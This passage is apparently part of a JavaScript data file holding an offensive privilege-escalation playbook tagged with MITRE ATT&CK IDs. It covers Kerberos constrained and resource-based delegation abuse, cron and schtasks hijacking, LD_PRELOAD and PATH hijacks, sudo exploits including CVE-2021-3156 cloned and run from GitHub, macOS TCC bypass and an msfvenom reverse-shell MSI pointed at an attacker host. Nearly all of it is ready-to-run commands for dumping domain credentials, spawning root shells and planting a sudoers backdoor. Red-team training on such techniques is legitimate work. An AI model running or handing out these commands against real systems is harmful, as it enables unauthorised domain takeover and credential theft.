        "Understanding constrained delegation — how it works:\n# Constrained delegation allows a service account to impersonate users, but ONLY to specific services\n# It uses two Kerberos extensions: S4U2Self and S4U2Proxy\n# S4U2Self: service requests a ticket to ITSELF on behalf of any user (without that user's password)\n# S4U2Proxy: service exchanges S4U2Self ticket for a ticket to the ALLOWED target SPN\n# Net result: we can get a Kerberos ticket AS 'administrator' for services listed in msDS-AllowedToDelegateTo\n# Find these accounts:\n$ findDelegation.py domain.com/user:pass -dc-ip DC_IP\n$ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties sAMAccountName,msDS-AllowedToDelegateTo | Select-Object sAMAccountName,msDS-AllowedToDelegateTo",
        "Step 2 — Obtain credentials/TGT for the delegating account:\n# You need the service account's password or NT hash to request a TGT\n# Get it via: Kerberoasting (if it has SPN), LSASS dump, SAM/NTDS dump, or compromise the host it runs on\n$ getTGT.py domain.com/svcaccount:ServicePass123 -dc-ip DC_IP\n# With hash (if you PTH'd the account):\n$ getTGT.py domain.com/svcaccount -hashes :NTLMHASH -dc-ip DC_IP\n$ export KRB5CCNAME=svcaccount.ccache\n# Verify TGT is obtained: klist (Linux) or Rubeus.exe triage (Windows)",
        "Step 3 — Forge service ticket via S4U2Self + S4U2Proxy:\n# getST.py performs the full S4U dance automatically\n$ getST.py -spn cifs/server.domain.com -impersonate administrator -dc-ip DC_IP domain.com/svcaccount:ServicePass123\n# What happens under the hood:\n# 1. getST requests TGT for svcaccount (or uses existing)\n# 2. S4U2Self: svcaccount requests ticket AS 'administrator' to itself\n# 3. S4U2Proxy: exchanges that for a cifs/ ticket to server.domain.com AS 'administrator'\n# Output: administrator@cifs_server.domain.com@DOMAIN.COM.ccache\n$ export KRB5CCNAME=administrator@cifs_server.domain.com@DOMAIN.COM.ccache",
        "Step 4 — Use forged ticket to access target service:\n$ secretsdump.py -k -no-pass server.domain.com    # Dump credentials as domain admin\n$ psexec.py -k -no-pass server.domain.com          # Interactive shell as domain admin\n$ wmiexec.py -k -no-pass administrator@server.domain.com  # WMI shell\n$ smbclient.py -k -no-pass //server.domain.com/C$  # Browse file system\n# -k: use Kerberos ticket from KRB5CCNAME env var\n# If cifs/DC01 is the target SPN: dump all domain hashes via secretsdump",
        "Finding constrained delegation in BloodHound:\n# Node detail: check 'Allowed To Delegate' property of service account\n# BloodHound edge: 'AllowedToDelegate' pointing to high-value computer\n# Cypher: MATCH p=(u:User)-[r:AllowedToDelegate]->(c:Computer) RETURN p\n# Look specifically for: cifs/DC, http/intranet, wsman/DC, mssqlsvc/server\n# Protocol transition enabled (TRUSTED_TO_AUTH_FOR_DELEGATION flag) = can S4U2Self for any user\n# Without protocol transition: S4U2Self only works for users with forwardable tickets\n$ nxc ldap DC_IP -u user -p pass --trusted-for-delegation"
      ]
    },
    {
      name: "Resource-Based Constrained Delegation (RBCD)",
      id: "T1558.RBCD",
      summary: "RBCD • addcomputer • msDS-AllowedToActOnBehalfOfOtherIdentity • S4U2Proxy",
      description: "Write msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object to forge service tickets as any domain user including Domain Admin",
      tags: ["RBCD", "addcomputer", "S4U2Proxy", "GenericWrite", "T1558"],
      steps: [
        "Find objects with write access to computer accounts:\n$ bloodhound-python -d domain.com -u user -p pass -dc DC_IP -c All\n# In BloodHound: look for GenericWrite / GenericAll / WriteProperty on Computer objects\n$ Get-ACL 'AD:CN=TARGET,CN=Computers,DC=domain,DC=com' | Select -ExpandProperty Access | Where {$_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite|GenericAll'}\n# Any account with write on a computer can configure RBCD on it",
        "Create a new machine account (uses MachineAccountQuota):\n$ addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack@123!' domain.com/user:pass -dc-ip DC_IP\n# Default MachineAccountQuota = 10, allows domain users to add computers\n# Or use existing compromised computer account\n$ nxc ldap DC_IP -u user -p pass -M maq\n# Check current MachineAccountQuota value",
        "Configure RBCD — set msDS-AllowedToActOnBehalfOfOtherIdentity:\n$ rbcd.py -f ATTACKPC$ -t TARGET$ -dc-ip DC_IP domain.com/user:pass\n# Sets TARGET$ to trust ATTACKPC$ to delegate on its behalf\n# Verify:\n$ Get-ADComputer TARGET -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity\n# Should reference ATTACKPC$ SID",
        "Request S4U ticket to impersonate Domain Admin on target:\n$ getST.py -spn host/TARGET.domain.com -impersonate administrator -dc-ip DC_IP domain.com/ATTACKPC$:Attack@123!\n$ export KRB5CCNAME='administrator@host_TARGET.domain.com@DOMAIN.COM.ccache'\n# S4U2Self: ATTACKPC$ gets a ticket as 'administrator' to itself\n# S4U2Proxy: exchanges it for a host/ ticket to TARGET$",
        "Use the forged ticket to own the target:\n$ psexec.py -k -no-pass TARGET.domain.com\n$ secretsdump.py -k -no-pass TARGET.domain.com\n$ wmiexec.py -k -no-pass administrator@TARGET.domain.com\n# Full Domain Admin access on target computer\n# Cleanup: remove RBCD attribute after use\n$ rbcd.py -f ATTACKPC$ -t TARGET$ -dc-ip DC_IP domain.com/user:pass --delete"
      ]
    },
    {
      name: "Scheduled Task - Privilege Escalation",
      id: "T1053.privesc",
      summary: "schtasks as SYSTEM • cron root • at command • launchd daemon",
      description: "Create or modify scheduled tasks to execute code as a higher-privileged account",
      tags: ["schtasks", "cron", "SYSTEM", "T1053"],
      steps: [
        "Create schtask as SYSTEM (Windows):\n$ schtasks /create /tn 'Update' /tr 'C:\\Temp\\payload.exe' /sc onstart /ru SYSTEM /f\n# /ru SYSTEM: runs as SYSTEM account\n# Triggers on startup before user login",
        "Modify existing privileged scheduled task:\n$ schtasks /query /fo LIST /v | findstr 'Task Name\\|Run As User'\n# Find tasks running as SYSTEM or admin\n$ schtasks /change /tn 'EXISTING_PRIVILEGED_TASK' /tr 'payload.exe'\n# Replace the executable in an existing SYSTEM task",
        "Linux cron privilege escalation:\n$ cat /etc/crontab  # Check system cron jobs\n$ ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/\n# If writable by current user:\n$ echo '* * * * * root /tmp/payload.sh' >> /etc/crontab\n# If cron script in writable directory:\n$ echo 'chmod +s /bin/bash' >> /etc/cron.daily/backup.sh",
        "Writable cron script escalation:\n$ find /etc/cron* /var/spool/cron* -writable 2>/dev/null\n# If a root-owned cron job calls a script we can write to:\n$ ls -la /opt/backup.sh  # writable by user\n$ echo 'chmod u+s /bin/bash' >> /opt/backup.sh\n# Wait for cron to execute → /bin/bash now SUID",
        "macOS LaunchDaemon escalation:\n# Create LaunchDaemon (root-level, runs as root)\n$ sudo launchctl load /Library/LaunchDaemons/com.attacker.plist\n# If we can write to LaunchDaemon directory (unusual)\n# Or modify existing LaunchDaemon plist"
      ]
    },
    {
      name: "Event-Triggered Execution - Environment Variables",
      id: "T1574.007",
      summary: "LD_PRELOAD • DYLD_INSERT_LIBRARIES • PATH manipulation • setenv privesc",
      description: "Manipulate environment variables to intercept privileged execution flow",
      tags: ["LD_PRELOAD", "DYLD", "PATH manipulation", "T1574"],
      steps: [
        "LD_PRELOAD for privilege escalation (sudo):\n$ sudo -l\n# If: (ALL) NOPASSWD: /usr/sbin/apache2\n$ cat /tmp/evil.c\n> #include <stdio.h>\n> #include <unistd.h>\n> void __attribute__((constructor)) init() {\n>     setuid(0); setgid(0);\n>     system('/bin/bash -p');\n> }\n$ gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.so\n$ sudo LD_PRELOAD=/tmp/evil.so apache2\n# LD_PRELOAD library loaded before sudo command → root shell",
        "PATH hijacking via sudo env:\n$ sudo -l\n# Look for: Defaults env_keep += 'PATH'\n# If PATH is preserved in sudo:\n$ mkdir /tmp/hijack && echo '#!/bin/bash\\nbash -p' > /tmp/hijack/cp\n$ chmod +x /tmp/hijack/cp\n$ export PATH=/tmp/hijack:$PATH\n$ sudo cp /etc/passwd /tmp/\n# Our 'cp' runs as root instead of /bin/cp",
        "Sudo SETENV privilege:\n$ sudo -l | grep SETENV\n# (root) SETENV: /usr/bin/python3\n$ sudo PYTHONPATH=/tmp/evil python3 -c 'import privesc'\n# /tmp/evil/privesc.py: os.system('/bin/bash -p')",
        "Linux capability abuse:\n$ getcap -r / 2>/dev/null\n# Look for: cap_setuid, cap_dac_override\n# python3 with cap_setuid:\n$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# This gives root without password",
        "macOS DYLD_INSERT_LIBRARIES:\n$ cat << 'EOF' > /tmp/evil.c\n#include <stdio.h>\nvoid __attribute__((constructor)) init() { system('/bin/bash'); }\nEOF\n$ gcc -dynamiclib /tmp/evil.c -o /tmp/evil.dylib\n$ DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /usr/bin/some_suid_binary\n# Only works on non-SIP-protected binaries"
      ]
    },
    {
      name: "Sudo and Sudo Caching",
      id: "T1548.003",
      summary: "Sudo token reuse • /etc/sudoers abuse • sudo -l • timestamp bypass",
      description: "Abuse sudo configuration and cached tokens for privilege escalation on Linux/macOS",
      tags: ["sudo", "sudoers", "sudo token", "T1548"],
      steps: [
        "Enumerate sudo privileges:\n$ sudo -l\n# List allowed commands — look for:\n# (ALL) NOPASSWD: specific binary\n# (root) /usr/bin/python3\n# Wildcard entries: /bin/cp * /etc/*",
        "GTFOBins sudo escapes:\n# python3: sudo python3 -c 'import os; os.system(\"/bin/bash\")'\n# find: sudo find . -exec /bin/sh \\; -quit\n# vim: sudo vim -c '!bash'\n# awk: sudo awk 'BEGIN {system(\"/bin/bash\")}'\n# perl: sudo perl -e 'exec \"/bin/bash\";'\n# Reference: https://gtfobins.github.io/#+sudo",
        "Sudo token reuse (no password prompt):\n# sudo tokens cached in /run/sudo/ts/ (15min default)\n# If we can write to ts directory: inject token\n$ python3 sudo_killer.py -l  # SUDO_KILLER: enumerate sudo misconfigs\n# Or exploit CVE-2019-14287: sudo -u#-1 command (if sudo < 1.8.28)\n$ sudo -u#-1 /bin/bash  # Bypasses user restriction — runs as root",
        "CVE-2021-3156 (Heap overflow in sudo):\n$ git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit && cd Sudo-1.8.31-Root-Exploit && make && ./exploit\n# Buffer overflow in sudoedit -s flag (CVE-2021-3156)\n# Affects sudo < 1.9.5p2\n# No sudo permissions needed — any user can exploit",
        "Modify /etc/sudoers if writable:\n$ ls -la /etc/sudoers\n# If writable by current user:\n$ echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\n$ visudo -c  # Syntax check\n# Or sudoers.d directory:\n$ echo 'username ALL=(ALL) NOPASSWD:/bin/bash' > /etc/sudoers.d/backdoor\n$ chmod 440 /etc/sudoers.d/backdoor"
      ]
    },
    {
      name: "Abuse Elevated Execution with Prompt",
      id: "T1548.004",
      summary: "AppleScript elevation • macOS TCC bypass • osascript • security_authorizationdb",
      description: "Abuse macOS elevation prompts and security frameworks to gain elevated privileges",
      tags: ["AppleScript", "macOS TCC", "osascript", "T1548"],
      steps: [
        "AppleScript administrator password prompt:\n$ osascript -e 'do shell script \"chmod +s /bin/bash\" with administrator privileges'\n# Prompts user for admin password\n# Social engineering: disguise as legitimate update",
        "TCC (Transparency Consent and Control) database bypass:\n# TCC controls: microphone, camera, disk access, screen recording\n# Location: ~/Library/Application Support/com.apple.TCC/TCC.db\n$ sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \\\n  'INSERT INTO access VALUES(\"kTCCServiceMicrophone\",\"com.evil.app\",0,1,1,NULL,NULL)'\n# Directly modify TCC DB if SIP is disabled",
        "LaunchAgent with malicious plist exploiting TCC:\n# Target: apps that already have TCC permissions\n# Inject into them via DLL/dylib injection\n# Inherit their TCC permissions for camera/mic/disk",
        "security_authorizationdb modification:\n# If we can modify Authorization database:\n$ security authorizationdb read system.privilege.admin > /tmp/admin.xml\n# Modify XML to remove authentication requirement\n$ security authorizationdb write system.privilege.admin /tmp/admin.xml\n# Now any user can perform admin actions without password",
        "Bypass macOS Gatekeeper:\n$ xattr -d com.apple.quarantine /path/to/app.app\n# Remove quarantine attribute set by Gatekeeper\n# App runs without 'unverified developer' warning\n# Also: spctl --add /path/to/app"
      ]
    },
    {
      name: "Hijack Execution Flow for Privilege Escalation",
      id: "T1574.privesc",
      summary: "Weak folder permissions • DLL planting • PATH injection • dyld",
      description: "Escalate privileges by placing malicious code in locations searched by privileged processes",
      tags: ["DLL planting", "PATH injection", "weak perms", "T1574"],
      steps: [
        "Find writable directories in system PATH:\n$ for dir in $(echo $PATH | tr ':' '\\n'); do ls -la $dir 2>/dev/null | grep -E '^d.*w'; done\n$ echo %PATH% | tr ';' '\\n'\n# If user-writable dir is in system PATH, plant malicious binary",
        "Windows weak folder permissions:\n$ icacls 'C:\\Program Files\\VulnApp' /T\n$ accesschk.exe -wuvc Everyone 'C:\\Program Files\\VulnApp'\n# If writable: plant malicious DLL in app directory\n# When service (SYSTEM) starts, loads our DLL",
        "AlwaysInstallElevated MSI privesc:\n$ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n$ reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# If both set to 1:\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o payload.msi\n$ msiexec /quiet /qn /i payload.msi  # Runs as SYSTEM",
        "Splinter via dyld on macOS:\n$ echo $DYLD_INSERT_LIBRARIES\n$ export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib\n$ /usr/bin/someapp  # Injects library into privileged process\n# Must be non-SIP protected binary for this to work",
        "Sudo binary replacement:\n$ which python3\n$ ls -la $(which python3)\n# If sudo allows: (ALL) /usr/bin/python3\n# And python3 is in user-writable directory:\n$ echo '#!/bin/bash\\nbash -p' > /home/user/bin/python3\n$ chmod +x /home/user/bin/python3\n$ sudo /usr/bin/python3  # Executes our script as root if PATH is set"
      ]
    }
  ]
};